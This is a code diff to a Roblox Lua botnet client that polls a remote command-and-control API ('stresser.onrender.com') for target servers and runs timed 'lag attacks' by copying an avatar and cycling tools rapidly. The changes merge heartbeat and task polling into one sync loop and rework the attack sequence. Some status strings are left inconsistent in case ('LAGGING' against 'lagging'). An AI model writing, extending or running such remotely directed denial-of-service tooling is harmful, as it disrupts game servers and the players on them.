@@ -17,8 +17,8 @@ local RunService = game:GetService("RunService")
 local CONFIG = {
     API_URL = "https://stresser.onrender.com",
     BOT_ID = "BOT_" .. string.upper(string.sub(game:GetService("RbxAnalyticsService"):GetClientId(), 1, 8)),
-    HEARTBEAT_INTERVAL = 15, -- Send heartbeat every 15 seconds (faster)
-    POLL_INTERVAL = 5,       -- Check for new targets every 5 seconds (much faster)
+    HEARTBEAT_INTERVAL = 5,  -- Combined heartbeat + task check every 5 seconds
+    POLL_INTERVAL = 5,       -- Check for new targets every 5 seconds
     AUTO_START = true,
     SCRIPT_URL = "https://raw.githubusercontent.com/SystemNasa/roblox/refs/heads/main/bot.lua",
     TOOL_CYCLE_DELAY = 0.05  -- Very fast tool cycling for lag (NO TTS, NO TELEPORTING)
@@ -187,8 +187,10 @@ local function makeRequest(endpoint, method, data)
     return success, response
 end
 
-local function sendHeartbeat()
-    local heartbeatData = {
+local function syncWithAPI()
+    if not botState.isActive then return nil end
+    
+    local syncData = {
         botId = CONFIG.BOT_ID,
         status = botState.status,
         currentPlace = tostring(game.PlaceId),
@@ -197,38 +199,24 @@ local function sendHeartbeat()
         uptime = math.floor(tick() - botState.startTime)
     }
     
-    local success, response = makeRequest("/bot-heartbeat", "POST", heartbeatData)
-    if success and response.Success then
-        log("Heartbeat sent - Status: " .. botState.status)
-        saveBotStatus(botState.status)
-        return true
-    else
-        log("Heartbeat failed", "ERROR")
-        return false
-    end
-end
-
-local function getTarget()
-    if not botState.isActive then return nil end
-    
-    -- Don't request new targets if already lagging
-    if botState.isLagging or botState.status == "LAGGING" then
-        return nil
-    end
-    
-    local success, response = makeRequest("/get-task?botId=" .. CONFIG.BOT_ID, "GET")
+    local success, response = makeRequest("/bot-sync", "POST", syncData)
     
     if success and response.Success then
         local data = HttpService:JSONDecode(response.Body)
+        log("API sync successful - Status: " .. botState.status)
+        saveBotStatus(botState.status)
+        
+        -- Return task if one was assigned
         if data.task then
             log("New target assigned: " .. data.task.placeId .. " | Duration: " .. data.task.duration .. "s")
             return data.task
         end
+        
+        return nil
     else
-        log("Failed to get target", "ERROR")
+        log("API sync failed", "ERROR")
+        return nil
     end
-    
-    return nil
 end
 
 -- Lag functionality based on lag.lua
@@ -369,18 +357,18 @@ local function startLagging()
     botState.status = "LAGGING"
     log("Starting lag attack for " .. botState.currentDuration .. " seconds", "ATTACK")
     
-    -- FIRST: Remove targeted items to prevent bot client lag - DO THIS BEFORE ANYTHING ELSE
-    if player.Character then
-        log("Removing targeted items to prevent client lag...", "ATTACK")
-        local removedCount = removeTargetedItems(player.Character)
-        log("Removed " .. removedCount .. " items, waiting 3 seconds before starting lag...", "ATTACK")
-        wait(3) -- Wait longer to ensure items are fully removed
-    end
-    
-    -- THEN: Copy avatar and get tools for lagging
-    log("Now copying avatar and getting tools...", "ATTACK")
+    -- FIRST: Copy avatar and get tools for lagging
+    log("Copying avatar and getting tools...", "ATTACK")
     copyAvatarAndGetTools("24k_mxtty1")
-    wait(1) -- Wait for avatar copy to complete
+    wait(2) -- Wait for avatar copy to complete and items to appear
+    
+    -- THEN: Remove targeted items that appeared after avatar copy
+    if player.Character then
+        log("Removing targeted items that appeared after avatar copy...", "ATTACK")
+        local removedCount = removeTargetedItems(player.Character)
+        log("Removed " .. removedCount .. " items, waiting 2 seconds before starting lag...", "ATTACK")
+        wait(2) -- Wait for items to be fully removed
+    end
     
     -- Start tool cycling loop only (no teleportation or TTS)
     log("Starting tool cycling lag...", "ATTACK")
@@ -395,10 +383,10 @@ local function stopLagging()
     if not botState.isLagging then return end
     
     botState.isLagging = false
-    botState.status = "COMPLETED"
+    botState.status = "completed"  -- Use lowercase to match API expectation
     botState.lagEndTime = 0
     
-    log("Lag attack completed, going idle", "ATTACK")
+    log("Lag attack completed, sending completed status to API", "ATTACK")
     
     -- Unequip tools
     pcall(function()
@@ -407,20 +395,22 @@ local function stopLagging()
         end
     end)
     
-    -- Send completed status to API immediately
-    sendHeartbeat()
+    -- Send completed status to API immediately - this should mark the attack as completed
+    syncWithAPI()
+    wait(2) -- Give API time to process the completed status
     
-    -- Clear status file to prevent restart loops
-    saveBotStatus("COMPLETED")
-    wait(1)
-    
-    -- Set to idle state
-    botState.status = "ONLINE"
+    -- Set to idle state after API processes completion
+    botState.status = "online"  -- Use lowercase
     botState.currentTarget = nil
     botState.joinTime = 0
-    saveBotStatus("ONLINE")
     
-    log("Status file cleared, bot now idle and ready for next attack", "ATTACK")
+    -- Send final online status
+    syncWithAPI()
+    
+    -- Clear status file to prevent restart loops
+    saveBotStatus("online")
+    
+    log("Attack marked as completed in API, bot now idle and ready for next attack", "ATTACK")
 end
 
 local function checkCurrentServer(target)
@@ -509,35 +499,30 @@ local function checkLagDuration()
     -- NO RESTART LOGIC - lag should only start once per attack
 end
 
--- Main loops
-local function heartbeatLoop()
+-- Main loop - combines heartbeat and task polling into single API call
+local function mainLoop()
     while botState.isActive do
-        sendHeartbeat()
-        wait(CONFIG.HEARTBEAT_INTERVAL)
-    end
-end
-
-local function targetPollingLoop()
-    while botState.isActive do
-        if botState.status == "ONLINE" then
-            local target = getTarget()
+        if botState.status == "online" then
+            -- Sync with API - sends heartbeat and gets new task if available
+            local target = syncWithAPI()
             if target then
                 executeAttack(target)
             else
                 log("No targets available, waiting...")
             end
-        elseif botState.status == "LAGGING" then
-            -- Only check lag duration when lagging, don't poll for new targets
+        elseif botState.status == "lagging" then
+            -- Only check lag duration when lagging, don't sync with API
             checkLagDuration()
-        elseif botState.status == "ATTACKING" or botState.status == "TELEPORTING" then
-            -- Don't poll when attacking or teleporting
-            wait(1)
+        elseif botState.status == "attacking" or botState.status == "teleporting" then
+            -- Just sync status, don't look for new tasks
+            syncWithAPI()
         else
-            -- For other statuses, check lag duration
+            -- For other statuses (completed, etc), sync and check lag duration
+            syncWithAPI()
             checkLagDuration()
         end
         
-        wait(CONFIG.POLL_INTERVAL)
+        wait(CONFIG.HEARTBEAT_INTERVAL) -- Now 5 seconds for everything
     end
 end
 
@@ -575,22 +560,17 @@ local function startBot()
     if botState.isActive then return end
     
     botState.isActive = true
-    botState.status = "ONLINE"
+    botState.status = "online"
+    botState.startTime = tick()
     
-    log("Bot activated automatically", "SYSTEM")
-    log("Bot ID: " .. CONFIG.BOT_ID)
-    log("Heartbeat interval: " .. CONFIG.HEARTBEAT_INTERVAL .. "s")
-    log("Poll interval: " .. CONFIG.POLL_INTERVAL .. "s")
-    log("API URL: " .. CONFIG.API_URL)
-    log("Status: READY FOR ATTACKS", "SYSTEM")
+    log("Bot started successfully", "SYSTEM")
     
-    -- Start all loops
-    spawn(heartbeatLoop)
-    spawn(targetPollingLoop)
+    -- Start single main loop (combines heartbeat + task polling)
+    spawn(mainLoop)
     
     -- Check if we're in a target server (after teleport)
     if botState.currentTarget and botState.joinTime > 0 then
-        botState.status = "IN_SERVER"
+        botState.status = "in_server"
         log("Resumed in target server", "ATTACK")
     end
 end
